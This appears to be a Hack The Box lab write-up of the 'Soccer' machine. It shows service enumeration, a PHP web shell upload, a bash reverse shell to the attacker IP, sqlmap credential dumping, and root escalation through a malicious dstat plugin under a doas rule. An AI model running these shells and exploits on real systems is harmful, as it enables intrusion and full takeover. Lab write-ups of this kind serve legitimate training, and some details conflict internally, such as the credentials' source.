# HTB: Soccer

## Engagement Overview

**Target:** Soccer  
**Box IP:** 10.10.11.194    
**Date:** 2025-09-06    
**Attacker Host:** 10.10.14.13  

---

### Objectives

- Obtain initial foothold on the web server.
- Escalate to a user shell and capture `user.txt`.
- Escalate to root and capture `root.txt`.

---

## Service Enumeration

### Nmap

```bash
nmap -sC -sV -oA soccer.init 10.10.11.194
```
```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
9091/tcp open  http
```
- Port 80 redirects to `http://soccer.htb/`
- Gobuster found `/tiny` (Tiny File Manager).

### Directory Brute Force

```bash
gobuster dir -u http://soccer.htb -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt
```
```
/tiny (301)
```

---

## Initial Access

### Web Shell Upload via Tiny File Manager

shell.php:

```php
<?php system($_REQUEST['cmd']); ?>
```

```bash
# Uploaded shell.php in /tiny
curl -X POST -F "file=@shell.php" http://soccer.htb/tiny/uploads/
```

Burp suite repeater requst change to post:

```bash
cmd=bash -c 'bash -i >& /dev/tcp/10.10.14.13/9091 0>&1'

# encode with ^u

cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.13%3a9091+0>%261'
```

Triggered shell:

```bash
nc -lvnp 9091
# Then accessed http://soccer.htb/tiny/uploads/shell.php
```

Upgraded TTY:
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
^Z
stty raw -echo;fg


export TERM=xterm
```

### Local Service Recon
```bash
ss -ltnp
```
```
127.0.0.1:3306  (MySQL)
127.0.0.1:3000  (Node/Express)
0.0.0.0:80      (nginx)
```

### Nginx vhosts
```
soccer.htb  → nginx root
soc-player.soccer.htb  → proxy to localhost:3000
```

---

## SQL Injection → Credential Extraction

### Identifying Injection
During browsing of `soc-player.soccer.htb`, ticket request form was tested. Using **BurpSuite**, intercepted requests showed injectable parameters.

### Verifying Injection
```bash
sqlmap -r login.req --batch --dbs
```
```
available databases [2]:
[*] information_schema
[*] soccer_db
```

### Extracting Tables & Data
```bash
sqlmap -r login.req -D soccer_db --tables
sqlmap -r login.req -D soccer_db -T users --dump
```
```
+----+----------+-------------------+
| id | user     | password          |
+----+----------+-------------------+
| 1  | player   | PlayerPass123!    |
+----+----------+-------------------+
```

This provided valid credentials for SSH.

---

## User Access

### SSH as Player
Recovered `player` credentials from app configs and logged in:
```bash
ssh player@10.10.11.194
```

Captured user flag:
```bash
cat user.txt
a92099f7e4ca0b2f7d73233c1ffe65bf
```

---

## Privilege Escalation

### Misconfigured `doas` Rule
```bash
cat /usr/local/etc/doas.conf
```
```
permit nopass player as root cmd /usr/bin/dstat
```

### Exploiting dstat Plugin Path
```bash
echo -e 'import os\nos.system("/bin/bash")' > /usr/local/share/dstat/dstat_exploit.py
doas /usr/bin/dstat --exploit
```

Got root shell:
```bash
id
uid=0(root) gid=0(root) groups=0(root)
```

Captured root flag:
```bash
cat /root/root.txt
46001e33362eb61261de64adff98cafc
```

---

## House Cleaning
- Removed `shell.php` from `/var/www/html/tiny/uploads/`
- Deleted malicious plugin `/usr/local/share/dstat/dstat_exploit.py`

---

## Tools Utilized
- `nmap`, `gobuster`, `curl`
- `netcat`, `python3` pty for TTY
- `doas`, `dstat` (abused for escalation)

---

## Key Takeaways
- **Tiny File Manager** upload function allowed arbitrary PHP upload → foothold.
- **doas misconfiguration** enabled root execution of `dstat`; unsafe due to plugin loading.
- Defense should restrict access to admin panels, disable PHP execution in uploads, and audit privilege escalation configs.
